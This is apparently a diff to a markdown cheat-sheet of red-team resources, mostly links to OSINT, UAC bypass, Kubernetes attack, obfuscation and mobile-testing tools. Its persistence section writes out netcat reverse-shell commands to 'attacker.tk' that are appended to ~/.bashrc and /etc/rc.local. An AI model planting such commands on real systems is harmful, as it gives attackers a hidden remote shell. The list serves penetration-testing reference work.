@@ -1,5 +1,7 @@
 # OSINT
 
+* [METAOsint (>4000)](https://metaosint.github.io/table)
+* [Chiasmodon - OSINT domain analyzer](https://github.com/chiasmod0n/chiasmodon)
 * [REVERSE WHOIS LOOKUP](https://github.com/devanshbatham/revwhoix)
 * [OSINT TOOLS 2023 (more than 600)](https://www.advisor-bm.com/osint-tools)
 * [GitLeaks (Git analayzer)](https://github.com/zricethezav/gitleaks)
@@ -75,14 +77,18 @@
 * UAC bypass
   * [artillery](https://github.com/hackerhouse-opensource/Artillery/tree/main)
   * [stinger](https://github.com/hackerhouse-opensource/Stinger)
-
-# PERSISTANT
+* [Adalanche - AD ACL Vizualizer](https://github.com/lkarlslund/Adalanche)
+* Kubernetes Attack&Defence
+ * [Attack](https://kubenomicon.com/)
+ * [Def](https://microsoft.github.io/Threat-Matrix-for-Kubernetes/tactics/Persistence/)
+* [LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer)
+# PERSISTANCE
 
 ## LINUX
 
 * Autorun
 
-    bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc
+    'bash$> echo "nc attacker.tk 8888 ‐e /bin/bash 2>/dev/null &" >>~/.bashrc'
 
 * Service
 
@@ -124,6 +130,8 @@
     bash#> echo "nc attacker.tk 8888 ‐e /bin/bash &" >> /etc/rc.local
 
 ## WINDOWS
+
+* [Windows domain persistence](https://hadess.io/pwning-the-domain-persistence/)
 
 * Autorun
 
@@ -231,9 +239,33 @@
 
 * [Flask Unsign - Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application](https://github.com/Paradoxis/Flask-Unsign)
 * [phpinfo() exploitation](https://telegra.ph/Ot-stranicy-phpinfo-do-kriticheskih-uyazvimostej-i-RCE-04-17)
+
+# Obfuscation
+
+* Powershell
+ * [Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
+ * [Chimera](https://github.com/tokyoneon/Chimera)
+* Python
+ * [Pyarmor](https://github.com/dashingsoft/pyarmor)
+ * [Hyperion](https://github.com/billythegoat356/Hyperion)
+* Bash
+ * [Blind-Bash](https://github.com/FajarKim/blind-bash)
+ * [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
+* Batch
+ * [BatchObfuscator](https://github.com/guillaC/BatchObfuscator)
+ * [Somalifuscator](https://github.com/KDot227/SomalifuscatorV2)
+* PHP
+ * [YAK Pro](https://github.com/pk-fr/yakpro-po)
+* VBA
+ * [VisualBasicObfuscator](https://github.com/mgeeky/VisualBasicObfuscator/tree/master)
+ * [VBad](https://github.com/Pepitoh/VBad)
+ * [MacroPack](https://github.com/sevagas/macro_pack)
 # Mobile APP
 * [QARK (Quick App Review Kit)](https://spy-soft.net/dekompilyaciya-apk/)
 * [appsecwiki](https://github.com/WhitePrime/appsecwiki)
+* [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF)
+* [Drozen](https://github.com/WithSecureLabs/drozer)
+* [APK Studio](https://github.com/vaibhavpandeyvpz/apkstudio)
 # Passwords
 * [Passwords manul](https://labs.lares.com/password-analysis/)
 * [Defaults&dorks](https://book.redteamguides.com/guides/tips-and-tricks)
